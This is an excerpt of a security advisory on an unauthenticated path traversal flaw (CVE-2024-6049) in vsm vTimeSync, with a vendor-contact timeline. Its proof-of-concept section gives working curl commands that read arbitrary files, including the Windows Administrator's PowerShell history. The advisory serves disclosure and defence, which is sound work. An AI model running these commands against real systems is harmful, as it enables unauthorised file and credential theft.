Business recommendation:
------------------------
The vendor provides a patch which should be installed immediately.

SEC Consult highly recommends to perform a thorough security review of the product
conducted by security professionals to identify and resolve potential further
security issues.


Vulnerability overview/description:
-----------------------------------
1) Unauthenticated Path Traversal Vulnerability (CVE-2024-6049)
The web interface of vsm LTC Time Sync (vTimeSync) is vulnerable to a path
traversal vulnerability. By sending a specially crafted HTTP request, an
unauthenticated remote attacker can download arbitrary files from the vulnerable
system. As a limitation, the exploitation is only possible if the requested file
has a file extension, e.g. .exe or .txt.

The web server is running with highest SYSTEM privileges per default, which
enables an attacker to gain access to privileged files.


Proof of concept:
-----------------
1) Unauthenticated Path Traversal Vulnerability (CVE-2024-6049)
To exploit the vulnerability it is sufficient to use the following curl-command
to send a request to the vulnerable web server:

curl http://$host:8033/.../.../.../.../.../.../.../.../.../<Path to file>

For example, the following command can be used to request the default file
win.ini:

curl http://$host:8033/.../.../.../.../.../.../.../.../.../Windows/win.ini

If the application is running with SYSTEM-privileges (default), the following
command can be used to exfiltrate the Powershell history of the Windows
administrator, which might leak sensitive information:

curl http://$host:8033/.../.../.../.../.../.../.../.../.../Users/Administrator/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt


Vulnerable / tested versions:
-----------------------------
The following version has been tested which was the latest version available
at the time of the test:
* 4.4.12.0

According to the vendor, versions before 4.5 are affected and v4.5.6.0
includes the fixes.


Vendor contact timeline:
------------------------
2024-01-22: Contacting vendor through info@...o.com; no response

             is supported.
2024-02-16: Vendor, submit either via email or JIRA; informing us
             that broadcasting software security levels are not that high
             as the network is usually not connected to the outside.
2024-02-16: Submitting security advisory to vendor JIRA; explaining
             our severity estimation and risks by exposing the affected
             service.
2024-02-20: Vendor has taken a look at the advisory, asking whether
             HTTPS would solve the issue.
             Telling vendor, that HTTPS won't fix the problem, describing
             the security issue again, providing link to OWASP path traversal
             page, etc.
2024-02-21: Vendor cannot reproduce issue in Chrome browser.
             Explaining how we exploited the vulnerability.

2024-05-15: Vendor recently introduced "a login" for vTimeSync which only
             lets people with a username and a PW access the page. Vendor asks
             us whether this would cover the vulnerability.
2024-05-23: Telling the vendor that a login does not fix the identified
             path traversal issue; no response.

2024-10-10: Asking for a status update.
             Vendor has no news, this topic is in the R&D backlog, no date yet
             when development will be started.
2024-10-11: Vendor states that the developers have already fixed the issue in
             the current release.
2024-10-17: Asking for the version numbers (affected / patched).
             Vendor provides download to version 4.5.6.0 including changelog.

             but also changes regarding SSL/HTTPS and logon feature in 4.5.0 and 4.5.1.
             Asking the vendor again, in which version the issue has been
             fixed.
             Vendor informs us the problem is fixed after v4.5 and we should use
             the latest version.
2024-10-21: Confirming version numbers, sending draft advisory to vendor and
